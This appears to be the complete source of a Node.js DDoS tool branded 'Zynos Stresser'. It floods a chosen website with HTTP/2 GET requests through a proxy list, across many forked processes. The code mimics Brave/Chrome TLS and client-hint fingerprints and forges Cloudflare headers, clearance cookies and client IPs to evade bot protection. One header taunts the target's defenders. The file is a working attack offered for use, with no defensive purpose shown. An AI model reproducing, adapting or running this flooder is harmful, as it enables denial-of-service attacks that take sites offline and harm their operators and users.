const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

// ========== COLOR CODES ==========
const blue = '\x1b[34m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

// ========== TLS CONFIG ==========
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
];

const language_header = [
    "id-ID,id;q=0.9,en;q=0.8",
    "en-US,en;q=0.9,id;q=0.8",
    "en-GB,en;q=0.9"
];

const cf_ray_prefixes = [
    "8a0a092ad9d940b0",
    "8a0a092ad9d940b1",
    "8a0a092ad9d940b2",
];

const cf_ray_locations = ['SIN', 'JAK', 'CGK', 'LAX', 'FRA', 'LHR'];

const countries = [
    "ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "IN",
    "PK", "BD", "NP", "LK", "KH", "LA", "MM", "TW", "HK", "MO",
    "GB", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK", "FI",
    "PL", "CZ", "HU", "AT", "CH", "BE", "PT", "IE", "GR", "RU",
    "US", "CA", "MX", "BR", "AR", "CL", "CO", "PE", "VE", "EC",
    "BO", "PY", "UY", "CR", "PA", "GT", "HN", "SV", "NI", "DO",
    "ZA", "NG", "EG", "KE", "MA", "DZ", "TN", "GH", "CI", "CM",
    "AU", "NZ", "FJ", "PG", "SB", "VU", "WS", "TO", "FM", "MH",
];

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const sec_ch_ua = [
    '"Brave";v="149", "Chromium";v="149", "Not?A_Brand";v="24"',
    '"Brave";v="150", "Chromium";v="150", "Not?A_Brand";v="24"',
    '"Brave";v="148", "Chromium";v="148", "Not?A_Brand";v="24"',
];

const sec_ch_ua_full = [
    '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
    '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
    '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
];

let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m`);
    console.log(`\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

// ========== NET SOCKET CLASS ==========
class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            } else {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randomHex(n) {
    return crypto.randomBytes(n/2).toString('hex');
}

function generateCFRay() {
    const prefix = randomElement(cf_ray_prefixes);
    const loc = randomElement(cf_ray_locations);
    return `${prefix}-${loc}`;
}

function generateCFVisitor() {
    const schemes = ['https', 'http'];
    return `{"scheme":"${randomElement(schemes)}"}`;
}

function generateXSSLID() {
    const ts = Math.floor(Date.now() / 1000);
    return `${ts}-${randomHex(20)}`;
}

function generateCookie() {
    const clearance = randomHex(32);
    return `_cf_clearance=${clearance}; __cf_bm=...; __cfruid=...`;
}

function generateRandomIP() {
    if (Math.random() < 0.5) {
        return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`;
    }
    const parts = [];
    for (let i = 0; i < 8; i++) {
        parts.push(randomHex(4));
    }
    return parts.join(':');
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = "443";
    
    let headers = {
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": (parsedTarget.path || "/") + "?" + randstr(3) + "=" + generateRandomString(10, 15),
        ":method": "GET",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding": "gzip, br",
        "accept-language": randomElement(language_header),
        "cache-control": "max-age=0",
        "connection": "keep-alive",
        "priority": "u=0, i",
        "referer": "https://example.com/",
        "sec-ch-ua": randomElement(sec_ch_ua),
        "sec-ch-ua-arch": "x86",
        "sec-ch-ua-bitness": "64",
        "sec-ch-ua-full-version-list": randomElement(sec_ch_ua_full),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-model": "",
        "sec-ch-ua-platform": "Windows",
        "sec-ch-ua-platform-version": "15.0.0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "cross-site",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "user-agent": randomElement(uap),
        "x-forwarded-proto": "https",
        "cookie": generateCookie(),
        "cf-ray": generateCFRay(),
        "cf-visitor": generateCFVisitor(),
        "cf-connecting-ip": generateRandomIP(),
        "x-ssl-id": generateXSSLID(),
        "origin": generateRandomIP(),
        "cf-ipcountry": randomElement(countries),
        "x-country": randomElement(countries),
        "x-forwarded-for": generateRandomIP(),
        "x-real-ip": generateRandomIP(),
        "x-xcddos-attack": "}⁠:⁠‑⁠)Your protect is verry bad, Just go home and drink your mother's milkO⁠_⁠o",
        "referrer-policy": "strict-origin-when-cross-origin",
        "x-requested-with": "XMLHttpRequest",
        "dnt": "1",
        "te": "trailers",
        "x-content-type-options": "nosniff"
    };
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 10
    };

    // CONNECT VIA PROXY THEN UPGRADE TO TLS
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ["h2"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: randomElement(cplist),
            secureContext: secureContext
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                tlsSocket.destroy();
                connection.destroy();
                return;
            }

            tlsSocket.setKeepAlive(true, 60000);
            tlsSocket.setNoDelay(true);

            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 32768,
                    initialWindowSize: 15564991,
                    maxFrameSize: 16384,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                const interval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {

                        const dynHeaders = {
                            ...headers
                        };

                        try {
                            const req = client.request(dynHeaders, {
                                parent: 0,
                                exclusive: true,
                                weight: 220
                            });

                            req.on('response', () => {
                                req.close();
                                req.destroy();
                            });

                            req.on('error', () => {
                                req.destroy();
                            });

                            req.end();
                        } catch (err) { }
                    }
                }, 500);

                client.on('close', () => clearInterval(interval));
            });

            client.on("error", () => {
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });

            client.on("close", () => {
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });
        });

        tlsSocket.on("error", () => {
            tlsSocket.destroy();
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });